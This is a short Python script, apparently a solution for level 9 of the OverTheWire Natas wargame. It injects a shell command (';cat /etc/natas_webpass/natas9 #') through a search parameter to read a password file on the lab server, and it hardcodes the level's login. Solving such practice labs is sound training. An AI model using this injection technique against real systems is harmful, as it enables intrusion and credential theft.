# level 9 -> level 10

import requests as r 
import re
import  urllib
from bs4 import BeautifulSoup as bs


def auth(username, password, URL):

    # RCE payload 
    payload = ';cat /etc/natas_webpass/natas9 #'

    # parameter in the GET request
    params = {
            "needle": payload,
            "submit": "Search"
    }    

    # URL encoding the text in the parameter
    url_encode = urllib.parse.urlencode(params)



    with r.session() as s:
        resp = s.get(URL , auth=(username, password), params=params, verify=False)
        content = resp.text
        
        # Retrive text natas 10 base64 password between the <pre></pre>tag
        soup = bs(content, 'html.parser')
        tag = soup.find('pre')
        print(f"natas 10 password :{tag.text}")



def main():
    username = 'natas9'
    password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'
    URL = f"http://{username}.natas.labs.overthewire.org/"
    results = auth(username,password,URL)

main()